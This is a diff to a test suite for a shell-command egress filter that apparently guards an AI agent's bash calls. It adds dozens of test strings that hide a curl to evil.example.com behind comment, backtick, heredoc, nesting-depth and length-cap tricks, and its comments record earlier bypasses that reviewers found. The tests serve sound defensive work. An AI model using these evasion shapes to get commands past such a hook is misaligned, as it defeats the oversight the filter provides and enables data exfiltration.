@@ -20,7 +20,7 @@ import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, isExternal, liftSubstitutions, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, isExternal, liftSubstitutions, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, MAX_COMMAND_CHARS } from '../../scripts/hooks/bash-egress-parser.mjs'
 import {
   BASH_EGRESS_DENY,
   agentGetsBashEgressParser,
@@ -307,6 +307,8 @@ describe('inert text is not a command', () => {
     expect(liftSubstitutions(`echo '$(a)'`).inners).toEqual([])
     expect(liftSubstitutions(`cat <<'E'\n$(a) \`b\`\nE`).inners).toEqual([])
     expect(liftSubstitutions(`cat <<E\n$(a)\nE`).inners).toEqual(['a'])
+    // a frame in an unquoted heredoc body is blanked in `stripped` too, its newlines kept (b58374d7 mutation: blank-code-only)
+    expect(liftSubstitutions(`cat <<E\nx $(a\nb) y\nE`).stripped).toBe(`cat <<E\nx    \n   y\nE`)
   })
 })
 
@@ -385,6 +387,249 @@ describe('a URL variable used inside a $(...) or backtick substitution', () => {
   it('a one-liner inside a substitution reads the outer loop value too', () => {
     expect(deny(`for u in https://evil.example/a; do echo "$(python3 -c "import urllib.request as r; r.urlopen('$u')")"; done`)).toBe(true)
   })
+  it('a backtick inside double quotes is a command too (card fae0712e, lexer mutant j13 dq-backtick)', () => {
+    expect(deny('u=https://evil.example/a; echo "got: `curl -s $u`"')).toBe(true)
+    expect(deny('for u in https://evil.example/a; do echo "x `curl -s $u` y"; done')).toBe(true)
+  })
+  // Viktor 42794 HIGH 1: a '#' inside ${ } / $(( )) / (( )) was read as a comment, the frame stayed open, and the
+  // lexer problems turned into allow ('unparseable'): a regression against the parent (8ac46977 denied these)
+  it('a # inside ${ }, $(( )) or (( )) hides no command (card fae0712e, Viktor 42794 HIGH 1)', () => {
+    for (const cmd of [
+      'echo ${x:- #}; curl https://evil.example.com/p',
+      'echo ${x:- a #b}; curl https://evil.example.com/p',
+      'echo ${x:- \\} #}; curl https://evil.example.com/p',
+      'echo $(( 1 #)); curl https://evil.example.com/p',
+      '(( 1 #)); curl https://evil.example.com/p',
+      // Viktor 42834 HIGH 2: a comment inside a backtick ends at the closing backtick (main denied these; 070607b7
+      // allowed them, and bash ran the curl)
+      'echo `echo a #` ; curl https://evil.example.com/p',
+      'x=`true #`; curl https://evil.example.com/p',
+      'echo "`echo a #`" ; curl https://evil.example.com/p',
+      'echo `echo a #``echo b #`; curl https://evil.example.com/p',
+      "echo `echo a # it's` ; curl https://evil.example.com/p",
+      // Viktor 42852 HIGH 3: a '#' right after a closed $( ), <( ), $(( )) or backtick is word text, bash runs the
+      // curl (main denied these, 39793c61 allowed them): the lexer read a comment, and the blanked-frame re-lex too
+      'cat <(true)#; curl https://evil.example.com/p',
+      'echo $((1))#; curl https://evil.example.com/p',
+      'echo $(( 1 ))#x; curl https://evil.example.com/p',
+      'echo a$(true)#; curl https://evil.example.com/p',
+      'x=$(true)#; curl https://evil.example.com/p',
+      'if true; then echo $(true)#; fi; curl https://evil.example.com/p',
+      'echo $(echo $(true)#)#; curl https://evil.example.com/p',
+      'echo $(true)#$(true)#; curl https://evil.example.com/p',
+      'echo $(true)#; curl https://evil.example.com/p',
+      'echo `echo a`#; curl https://evil.example.com/p',
+      'echo `echo a`#b; curl https://evil.example.com/p',
+      'echo `echo a``echo b`#; curl https://evil.example.com/p',
+      'echo a`true`#; curl https://evil.example.com/p',
+      'echo `echo a #`#; curl https://evil.example.com/p',
+      'echo a`true #`#b; curl https://evil.example.com/p',
+    ]) expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+  })
+  // the frame matrix (Klodel 42854): bash 3.2 runs $((cmd) ) and ((cmd) ) as a subshell (a ')' at depth 0 not followed
+  // by ')'); main denied these, 63498a20 allowed them ('unparseable'). $(( (cmd) )) is arithmetic: bash runs nothing.
+  // Viktor 42888 HIGH 4: a syntax error inside a backtick body (an unterminated quote, a comment in a $( )) made the
+  // lexer swallow the closing backtick; problems, and the allow ('unparseable') let a curl through that bash ran
+  // (main denied all 23). Fixed in the lexer (bodyEnd) and closed as a class by the unparseable-external reserve.
+  it('a syntax error inside a backtick body hides no command after it (Viktor 42888 HIGH 4)', () => {
+    for (const cmd of [
+      "echo `echo '`; curl https://evil.example.com/p",
+      "echo `echo $(echo a #)`#; curl https://evil.example.com/p",
+      "echo `echo $(echo a #)`; curl https://evil.example.com/p",
+      "echo `echo 'a`; curl https://evil.example.com/p",
+      "echo `echo 'a'b'`; curl https://evil.example.com/p",
+      "x=`echo '`; curl https://evil.example.com/p",
+      "`echo '`; curl https://evil.example.com/p",
+      "`echo $(echo a #)`; curl https://evil.example.com/p",
+      "echo \"`echo '`\"; curl https://evil.example.com/p",
+      "echo \"`echo $(echo a #)`\"; curl https://evil.example.com/p",
+      "for i in `echo '`; do :; done; curl https://evil.example.com/p",
+      "echo `echo \"$(echo a #)\"`; curl https://evil.example.com/p",
+      "echo `echo $(echo ')`; curl https://evil.example.com/p",
+      "echo `echo $(echo a #) b`; curl https://evil.example.com/p",
+      "echo `echo ${x:-'}`; curl https://evil.example.com/p",
+      "echo `echo <(echo a #)`; curl https://evil.example.com/p",
+      "echo `echo '`#; curl https://evil.example.com/p",
+      "echo `echo '`\ncurl https://evil.example.com/p",
+      "echo `echo '` | cat; curl https://evil.example.com/p",
+      "if true; then echo `echo '`; curl https://evil.example.com/p; fi",
+      "{ echo `echo '`; curl https://evil.example.com/p; }",
+      "echo `echo '` && curl https://evil.example.com/p",
+      "bash -c \"echo `echo '`; curl https://evil.example.com/p\"",
+    ]) expect(classify(cmd).deny, cmd).toBe(true)
+  })
+  // Klodel 42889: text the lexer does not fully understand denies when its raw text holds an external URL and a
+  // network tool (or an interpreter with a network primitive); without either it stays an allow
+  it('unparseable text with an external URL and a network tool denies (unparseable-external, Klodel 42889)', () => {
+    for (const cmd of ["echo 'a ; curl https://evil.example.com/p", "echo \"x ; c\\\"\\\"url https://evil.example.com/p", "echo 'x ; python3 -c \"import urllib.request\" https://evil.example.com/p"])
+      expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external' })
+    // Viktor 42933 INFO 1 (a): every network tool of the reserve, not only curl; an interpreter needs a network primitive
+    for (const cmd of ["echo 'a ; wget https://evil.example.com/p", "echo 'a ; nc https://evil.example.com/p 443",
+      "echo 'a ; ncat https://evil.example.com/p 443", "echo 'a ; node -e \"fetch(1)\" https://evil.example.com/p"])
+      expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'unparseable-external' })
+    for (const cmd of ["echo 'a ; ls https://evil.example.com/p", "echo 'a ; curl http://localhost:3420/x", "echo 'unterminated",
+      "echo 'a ; python3 x.py https://evil.example.com/p", "echo 'a ; wgetx https://evil.example.com/p"])
+      expect(classify(cmd), cmd).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+  // Viktor 42933 HIGH 5: a deep nesting (`$(( ` 2000 deep, `${x:-` 6000 deep) overflowed the recursive frame walk; the
+  // hook's catch allowed, and bash ran the curl after it (main denied: subst-too-deep). The walk keeps its own stack
+  // now, and the blanking is linear (40 000 nested frames took 4-6 s, towards the hook's timeout, which allows).
+  it('a deep nesting before an external curl denies, fast (Viktor 42933 HIGH 5)', () => {
+    const U = '; curl https://evil.example.com/p'
+    const shapes: [string, string][] = [['$(( ', ' ))'], ['$(( 1 + ', ' ))'], ['${x:-', '}'], ['$(( ${x:-', ' }))'], ['"$(( ', ' ))"'],
+      ['$( ', ' )'], ['<( ', ' )'], ['( ', ' )'], ['{ ', '; }'], ['(( ', ' ))'], ['$[ ', ' ]'], ['$(( (', ') ))']]
+    for (const [o, c] of shapes) {
+      for (const n of [2000, 6000, 40000]) {
+        const t0 = Date.now()
+        const r = classify('echo ' + o.repeat(n) + '1' + c.repeat(n) + U)
+        expect(r.deny, `${o} x ${n}`).toBe(true)
+        expect(r.reason, `${o} x ${n}`).not.toBe('internal-error-external')
+        expect(Date.now() - t0, `${o} x ${n}`).toBeLessThan(2000)
+      }
+    }
+    for (const n of [8000, 20000]) expect(classify('echo ' + '`echo $(( 1 + '.repeat(n) + U).deny, `backtick x ${n}`).toBe(true)
+  })
+  // Whatever throws while reading a command, the reserve decides; without a hit the error goes on as before (the hook
+  // then allows, as it always did on an internal error). The seam: a command whose first String() throws.
+  it('an internal error denies when the raw text holds an external URL and a network tool (Viktor 42933 HIGH 5)', () => {
+    const throwsOnce = (text: string) => { let n = 0; return { toString: () => { if (n++ === 0) throw new RangeError('x'); return text } } }
+    expect(classify(throwsOnce('echo a; c"u"rl https://evil.example.com/p') as unknown as string)).toMatchObject({ deny: true, reason: 'internal-error-external' })
+    expect(classify(throwsOnce('echo a; cu\\\nrl https://evil.example.com/p') as unknown as string)).toMatchObject({ deny: true, reason: 'internal-error-external' })
+    expect(() => classify(throwsOnce('echo a; ls https://evil.example.com/p') as unknown as string)).toThrow(RangeError)
+    expect(() => classify(throwsOnce('echo a; curl http://localhost:3420/x') as unknown as string)).toThrow(RangeError)
+  })
+  // Viktor 2026-11-15 LOW 1: after an internal error a network tool with no URL literal at all denies too (its
+  // destination is a variable or a host without a scheme); a dashboard call to its literal localhost URL still goes on
+  // to the caller (the hook allows), and so does a command with no network tool.
+  it('an internal error denies a network tool whose destination is no URL literal (Viktor 2026-11-15 LOW 1)', () => {
+    const throwsOnce = (text: string) => { let n = 0; return { toString: () => { if (n++ === 0) throw new RangeError('x'); return text } } }
+    for (const cmd of ['echo a; curl -s "$U"', 'curl evil.example.com/x?d=1', 'echo a; w""get $U', 'node /x/scripts/gh-pr.mjs marveen pr view 1'])
+      expect(classify(throwsOnce(cmd) as unknown as string), cmd).toMatchObject({ deny: true, reason: 'internal-error-network' })
+    // a shell with an external URL literal is the stdin-shell-external shape
+    expect(classify(throwsOnce('bash <<EOF\ngit clone https://evil.example.com/r\nEOF') as unknown as string)).toMatchObject({ deny: true, reason: 'internal-error-external' })
+    for (const cmd of ['echo a; ls $U', 'curl -s http://localhost:3420/api/x -d "$P"', 'echo curly $U', 'bash x.sh $U'])
+      expect(() => classify(throwsOnce(cmd) as unknown as string), cmd).toThrow(RangeError)
+  })
+  // Viktor 2026-11-15 HIGH 6 (b58374d7, also on main): classify() was quadratic in three shapes, past the hook's 10 s
+  // timeout (which allows) before the curl. Measured on b58374d7: (a) 12 000 `for i in a; do x=$i; done;` 12 s, (b) 3 000
+  // distinct loop variables 10 s, 6 000 47 s, (c) 12 000 `vN=$(echo a); ` 17 s. Under the length cap the full reading
+  // is fast now (b58374d7, same sizes: a4 2,8 s, b 6,5 s, c 2,3 s); past it the cheap reading decides.
+  it('long loop and assignment chains before an external curl deny, fast (Viktor 2026-11-15 HIGH 6)', () => {
+    const U = 'curl https://evil.example.com/p'
+    const R = (n: number, f: (k: number) => string) => Array.from({ length: n }, (_, k) => f(k)).join('')
+    const shapes: [string, string, string][] = [
+      // under MAX_COMMAND_CHARS: the full reading
+      ['a4 1900', "for i in a b c d; do x=$i; done; ".repeat(1900) + U, 'curl-external'],
+      ['b 1900', R(1900, (k) => `for v${k} in a; do x=$v${k}; done; `) + U, 'curl-external'],
+      ['c 3800', R(3800, (k) => `v${k}=$(echo a); `) + U, 'curl-external'],
+      ['c own assignment 2000', R(2000, (k) => `v${k}=$(y=1; echo a); `) + U, 'curl-external'],
+      // past it: the cheap reading
+      ['a 12000', 'for i in a; do x=$i; done; '.repeat(12000) + U, 'command-too-long-external'],
+      ['b 3000', R(3000, (k) => `for v${k} in a; do x=$v${k}; done; `) + U, 'command-too-long-external'],
+      ['b 6000', R(6000, (k) => `for v${k} in a; do x=$v${k}; done; `) + U, 'command-too-long-external'],
+      ['c 12000', R(12000, (k) => `v${k}=$(echo a); `) + U, 'command-too-long-external'],
+    ]
+    for (const [name, cmd, reason] of shapes) {
+      expect(cmd.length > MAX_COMMAND_CHARS, name).toBe(reason.startsWith('command-too-long'))
+      const t0 = Date.now()
+      expect(classify(cmd), name).toMatchObject({ deny: true, reason })
+      expect(Date.now() - t0, name).toBeLessThan(2000)
+    }
+  })
+  // Past MAX_COMMAND_CHARS the command is not read in full. The cheap reading denies on any network tool (also one
+  // without a URL literal: a literal-only rule let `curl evil.example.com/x` padded past the cap through), on gh-pr.mjs
+  // (its pin is fail-closed), and on an external URL literal next to a shell or an interpreter with a network
+  // primitive. A long command without any of them stays an allow.
+  it('a command past MAX_COMMAND_CHARS is judged by the cheap reading (fae0712e h8)', () => {
+    const pad = '# ' + 'a'.repeat(MAX_COMMAND_CHARS) + '\n'
+    for (const [cmd, reason] of [
+      [pad + 'curl https://evil.example.com/p', 'command-too-long-external'],
+      [pad + 'curl evil.example.com/x?d=1', 'command-too-long-network'],
+      [pad + 'curl -s "$U"', 'command-too-long-network'],
+      [pad + 'curl -s http://localhost:3420/api/x', 'command-too-long-network'],
+      [pad + 'node /x/scripts/gh-pr.mjs marveen pr view 1', 'command-too-long-network'],
+      [pad + "bash <<EOF\ngit clone https://evil.example.com/r\nEOF", 'command-too-long-external'],
+      [pad + "python3 - <<'PY'\nimport urllib.request; urllib.request.urlopen('https://evil.example.com/p')\nPY", 'command-too-long-external'],
+    ] as const) expect(classify(cmd), cmd.slice(-60)).toMatchObject({ deny: true, reason })
+    for (const cmd of [pad + 'echo https://evil.example.com/p', pad + 'git status', `cat > f <<'EOF'\n${'x '.repeat(MAX_COMMAND_CHARS)}\nEOF`,
+      pad + "python3 -c 'print(1)' https://evil.example.com/p", pad + "bash -c 'echo hi' http://localhost:3420/x"])
+      expect(classify(cmd), cmd.slice(-60)).toMatchObject({ deny: false, reason: 'command-too-long' })
+    // at the cap the full reading still runs
+    const at = 'echo ' + 'a'.repeat(MAX_COMMAND_CHARS - 'echo '.length - '; curl -s "$U"'.length) + '; curl -s "$U"'
+    expect(at.length).toBe(MAX_COMMAND_CHARS)
+    expect(classify(at)).toMatchObject({ deny: false, reason: null })
+  })
+  // loopVariants looks only at the loop variables the text names (HIGH 6), in DEFINITION order as b58374d7 did: a
+  // value spelling another loop variable (`for a in '$b'`) is pasted raw and replaced again when that variable comes
+  // later. Order of appearance in the text (Viktor's proposed patch) changed both decisions below.
+  it('loop readings keep the definition order of the loop variables (fae0712e h8)', () => {
+    expect(classify("for a in '$b'; do :; done; for b in evil.example.com; do curl -H $b $a; done")).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify("for b in evil.example.com; do :; done; for a in '$b'; do curl $a -H $b; done")).toMatchObject({ deny: false, reason: null })
+    expect(classify("for a in '$b'; do :; done; for b in https://evil.example.com/p; do curl -H $b $a; done")).toMatchObject({ deny: true, reason: 'curl-external' })
+    // the size check before the product: 65 values deny unbounded, 64 are read one by one
+    const vals = (n: number) => Array.from({ length: n }, (_, k) => `h${k}.local`).join(' ')
+    expect(classify(`for u in ${vals(65)}; do curl $u; done`)).toMatchObject({ deny: true, reason: 'curl-loop-unbounded' })
+    expect(classify(`for u in ${vals(64)}; do curl $u; done`)).toMatchObject({ deny: false })
+    expect(classify(`for u in ${vals(8)}; do for w in ${vals(8)}; do curl $u/$w; done; done`)).toMatchObject({ deny: false })
+    expect(classify(`for u in ${vals(8)}; do for w in ${vals(9)}; do curl $u/$w; done; done`)).toMatchObject({ deny: true, reason: 'curl-loop-unbounded' })
+    // a loop variable in braces is read too
+    expect(classify('for u in evil.example.com; do curl -s ${u}/x; done')).toMatchObject({ deny: true, reason: 'curl-external' })
+    // only a spelling the variable's own pattern matches makes readings: `${u:-x}` makes none (65 values, no unbounded
+    // deny). NOT a claim that this is right: a loop variable or an assignment in a `${u:-x}` / `${u%/}` form is not
+    // expanded at all, in b58374d7 either (open, reported with fae0712e h8).
+    expect(classify(`for u in ${vals(65)}; do curl -s http://localhost:3420/x -d \${u:-x}; done`)).toMatchObject({ deny: false })
+    // the values of every loop over one name are collected (after the first loop bash's curl got evil.example.com)
+    expect(classify('for u in evil.example.com; do curl -s $u; done; for u in localhost; do :; done')).toMatchObject({ deny: true, reason: 'curl-external' })
+  })
+  // A frame's own assignments are layered over the enclosing ones (not copied): an inner one shadows an outer one of
+  // the same name, a sibling frame does not see it, and a name the frame does not set is read from the outer command.
+  it('a frame reads the enclosing assignments and loops, its own shadow them (fae0712e h8)', () => {
+    expect(classify('u=https://evil.example.com/p; x=$(curl -s $u)')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('u=http://localhost:3420/a; x=$(u=https://evil.example.com/p; curl -s $u)')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('u=https://evil.example.com/p; x=$(u=http://localhost:3420/a; curl -s $u)')).toMatchObject({ deny: false })
+    expect(classify('u=evil.example.com; x=$(echo $(echo $(curl -s $u)))')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('for u in evil.example.com; do :; done; x=$(for w in a; do :; done; curl -s $u)')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('x=$(for u in evil.example.com; do :; done); y=$(curl -s $u)')).toMatchObject({ deny: false })
+    // a frame with assignments of its own still reads the enclosing ones; its own do not leak out to the command or a sibling
+    expect(classify('u=evil.example.com; x=$(y=1; curl -s $u)')).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('x=$(u=evil.example.com; true); curl -s $u')).toMatchObject({ deny: false })
+    expect(classify('x=$(u=evil.example.com; true); y=$(curl -s $u)')).toMatchObject({ deny: false })
+  })
+  it('a $(( or (( that bash reads as a subshell hides no command (Klodel 42854 matrix)', () => {
+    for (const cmd of [
+      'echo $((curl https://evil.example.com/p) )',
+      'echo $((curl https://evil.example.com/p); true )',
+      'echo $((true); curl https://evil.example.com/p )',
+      'x=$((curl https://evil.example.com/p)|cat)',
+      'echo "$((curl https://evil.example.com/p) )"',
+      '((curl https://evil.example.com/p) )',
+    ]) expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: ['evil.example.com'] })
+  })
+  // Klodel 42854: the gate against a real bash on every oracle case, the frame x {# ; | & newline} x {inside, after}
+  // matrix included (scripts/lib/shell-lex-oracle.json). Every marker bash RAN, replaced by an external curl, is
+  // denied. The 39793c61 gate missed 106 of these 868 (the HIGH 3 class); a marker bash did not run may be denied.
+  it('every command bash runs in the oracle and the matrix, made a curl, is denied (Klodel 42854)', () => {
+    const cases = JSON.parse(readFileSync(join(ROOT, 'scripts', 'lib', 'shell-lex-oracle.json'), 'utf8')).cases as Array<{ cmd: string; markers: string[]; ran: string[]; cell?: string }>
+    const miss: string[] = []
+    let checks = 0
+    for (const c of cases) for (const m of c.ran) {
+      checks++
+      const cmd = c.cmd.replace(new RegExp(`\\b${m}\\b`, 'g'), 'curl https://evil.example.com/p')
+      if (!classify(cmd).deny) miss.push(`${c.cell ?? 'random'} ${JSON.stringify(cmd)}`)
+    }
+    expect(checks).toBeGreaterThanOrEqual(800)
+    expect(miss).toEqual([])
+  })
+  it('a # after a plain ( ) subshell or the (( )) command is a comment (Viktor 42852: bash does not run the curl)', () => {
+    for (const cmd of ['(true)#; curl https://evil.example.com/p', '((1))#; curl https://evil.example.com/p'])
+      expect(classify(cmd).deny, cmd).toBe(false)
+  })
+  it('lexer mutants j01 and j07 flip a verdict (Viktor 42794 (3))', () => {
+    // j01 striptabs-off: the tab-stripped delimiter closes the body, the curl after it runs
+    expect(deny('cat <<-E\n\tbody\n\tE\ncurl https://evil.example.com/p')).toBe(true)
+    // j07 dollarq-escape: in $'..' the escaped quote does not close, the # is string text, the ; separates
+    expect(deny("echo $'a\\'#'; curl https://evil.example.com/p")).toBe(true)
+  })
   it('the inner command\'s own assignment wins over the outer one', () => {
     expect(deny('u=https://evil.example/a; x=$(u=http://localhost:3420/b; curl -s $u)')).toBe(false)
     expect(deny('u=http://localhost:3420/b; x=$(u=https://evil.example/a; curl -s $u)')).toBe(true)
@@ -452,7 +697,6 @@ describe('still open after (a) -- pinned on purpose', () => {
   const OPEN = [
     'bash ./fetch.sh', // the network call is inside the script file
     'python3 fetch.py',
-    `python3 -c "$(cat <<'PY'\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY\n)"`, // program via -c "$(cat <<PY)"
     `cat > /tmp/x.py <<'PY'\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY\npython3 /tmp/x.py`, // written, then run as a file
     `printf '%s' 'import urllib.request; urllib.request.urlopen("https://example.org")' | tr a a | python3 -`, // only the span right before the | is read
     'H=$(cat host.txt); curl -s "http://$H/x"', // host not literally in the command
@@ -1073,5 +1317,80 @@ describe('an interpreter deny names the shape that passes (4393e82b, 3d3307dd re
   it('an interpreter one-liner gets the same hint; a plain curl deny does not', () => {
     expect(reason(`python3 -c 'import urllib.request; urllib.request.urlopen("https://example.invalid/x")'`)).toContain('--data-binary @')
     expect(reason('curl -s https://example.invalid/x')).not.toContain('--data-binary @')
+  })
+})
+
+// card fae0712e: the parser takes its shell structure (quotes, # comments, heredoc bodies, substitutions,
+// command boundaries, words) from the shared lexer scripts/lib/shell-lex.mjs. Each row below was judged
+// differently by the hand-written reader before (measured on the HEAD copy, 2026-11-15).
+describe('structure from the shared shell lexer (card fae0712e)', () => {
+  const U = 'http://example.org/x'
+  it('a comment is no command and no destination (the old reader split and read inside it)', () => {
+    // card fae0712e
+    for (const cmd of [
+      `ls # todo; curl -s ${U}`,
+      `ls # bash -c 'curl -s ${U}'`,
+      `# $(curl -s ${U})`,
+      'curl -s http://localhost:3420/api/health # docs: https://example.org/docs',
+    ]) expect({ cmd, ...classify(cmd) }).toMatchObject({ cmd, deny: false })
+  })
+  it('a URL in a comment is no "external literal" for the unresolved-destination reserve', () => {
+    // card fae0712e
+    expect(classify('curl -s "$URL" # see https://example.org/doc')).toMatchObject({ deny: false })
+    expect(classify('echo https://example.org/doc; curl -s "$URL"')).toMatchObject({ deny: true, reason: 'curl-unresolved-destination' })
+  })
+  it('an escaped separator does not split; a quoted one never did', () => {
+    // card fae0712e
+    expect(classify(`echo a \\; curl ${U}`)).toMatchObject({ deny: false })
+    expect(classify(`find . -name x -exec grep -l y {} \\; ; curl -s ${U}`)).toMatchObject({ deny: true, hosts: ['example.org'] })
+    expect(classify(`echo "a; curl ${U}"`)).toMatchObject({ deny: false })
+  })
+  it('a heredoc ends only at its exact terminator line (bash does not take "  EOF")', () => {
+    // card fae0712e
+    expect(classify(`cat > f.md <<'EOF'\n  EOF\ncurl -s ${U}\nEOF`)).toMatchObject({ deny: false })
+    expect(classify(`cat > f.md <<'EOF'\nx\nEOF\ncurl -s ${U}`)).toMatchObject({ deny: true, hosts: ['example.org'] })
+  })
+  it('a quoted, escaped or continued command word is still curl', () => {
+    // card fae0712e
+    for (const cmd of [`"curl" -s ${U}`, `c\\url -s ${U}`, `cu\\\nrl -s ${U}`, `curl -s \\\n  ${U}`])
+      expect({ cmd, ...classify(cmd) }).toMatchObject({ cmd, deny: true, reason: 'curl-external', hosts: ['example.org'] })
+  })
+  it("a shell's -c string in $'...' is decoded", () => {
+    // card fae0712e
+    expect(classify(`bash -c $'\\x63url -s ${U}'`)).toMatchObject({ deny: true, hosts: ['example.org'] })
+  })
+  it('a heredoc delimiter after a space, and a variable set to - in the command, feed the program on stdin', () => {
+    // card fae0712e
+    const PY = `import urllib.request\nurllib.request.urlopen("${U}")`
+    expect(classify(`python3 << 'PY'\n${PY}\nPY`)).toMatchObject({ deny: true, reason: 'stdin-interpreter-external' })
+    expect(classify(`S=-; python3 "$S" <<'PY'\n${PY}\nPY`)).toMatchObject({ deny: true, reason: 'stdin-interpreter-external' })
+    expect(classify(`python3 <<< "${PY.replace('\n', '; ').replace(/"/g, "'")}"`)).toMatchObject({ deny: true, reason: 'stdin-interpreter-external' })
+  })
+  it('text the lexer does not fully understand is still judged on what it read', () => {
+    // card fae0712e: before, an unterminated quote anywhere made the whole command an unread allow
+    expect(classify(`curl -s ${U}\necho "unterminated`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`echo "unterminated\ncurl -s http://localhost:3420/x`)).toMatchObject({ deny: false, reason: 'unparseable' })
+  })
+  it('an unclosed backtick in an unquoted heredoc body ends with the body, and the next line is still read', () => {
+    // card fae0712e: measured on a fleet command (2026-11-15); before, the whole command was an unread allow
+    expect(classify("python3 - <<PY\nprint('`' in s)\nPY\ncurl -s " + U)).toMatchObject({ deny: true, hosts: ['example.org'] })
+  })
+  it('a command frame inside ${ } is still read', () => {
+    // card fae0712e
+    expect(classify(`x=\${y:-$(curl -s ${U})}`)).toMatchObject({ deny: true, hosts: ['example.org'] })
+    expect(classify('echo "${#arr[@]} ${x:-a}"')).toMatchObject({ deny: false })
+  })
+  it('CLOSED (Klodel 42889): a heredoc inside a substitution is a lexer problem; with an external URL and a network tool in it, it denies', () => {
+    // card fae0712e: bash 3.2 finds the `)` first, bash 5 and zsh read the body first; with a quote in the body the
+    // two readings disagree on where the substitution ends, and the curl after it is not read. It was an allow
+    // ('unparseable'); the unparseable-external reserve now denies it, and the -c "$(cat <<'PY' ...)" program too.
+    expect(classify(`git commit -m "$(cat <<'EOF'\nfix: don't break\nEOF\n)" && curl -s ${U}`)).toMatchObject({ deny: true, reason: 'unparseable-external' })
+    expect(classify(`python3 -c "$(cat <<'PY'\nimport urllib.request; urllib.request.urlopen('https://example.org')\nPY\n)"`)).toMatchObject({ deny: true, reason: 'unparseable-external' })
+    expect(classify(`git commit -m "$(cat <<'EOF'\nfix: don't break\nEOF\n)" && ls`)).toMatchObject({ deny: false, reason: 'unparseable' })
+    expect(classify(`git commit -m "$(cat <<'EOF'\nfix: x\nEOF\n)" && curl -s ${U}`)).toMatchObject({ deny: true, hosts: ['example.org'] })
+  })
+  it('STILL OPEN, pinned: a program file named by an unknown variable is a program file (open point (a))', () => {
+    // card fae0712e: the old reader could not see a quoted word and read the heredoc as the program
+    expect(classify(`python3 "$S" - <<'PY'\nimport urllib.request\nurllib.request.urlopen("${U}")\nPY`)).toMatchObject({ deny: false })
   })
 })
